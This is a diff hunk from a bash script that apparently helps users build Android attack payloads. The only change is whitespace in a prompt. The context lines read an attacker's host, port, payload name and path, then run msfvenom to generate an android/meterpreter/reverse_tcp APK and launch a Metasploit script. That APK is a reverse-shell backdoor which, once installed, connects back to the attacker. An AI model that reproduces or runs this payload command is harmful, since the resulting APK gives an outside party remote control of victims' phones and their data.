@@ -59,7 +59,7 @@ read -p "                       LPORT----->" lport
 echo -e $yellow " please insert Name payload :>"
 read -p "                       Name----->" name
 echo -e $red " please insert path :>"
-read -p "                             Path----->" path
+read -p "                    Path----->" path
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk
 bash metasploit.sh
 fi
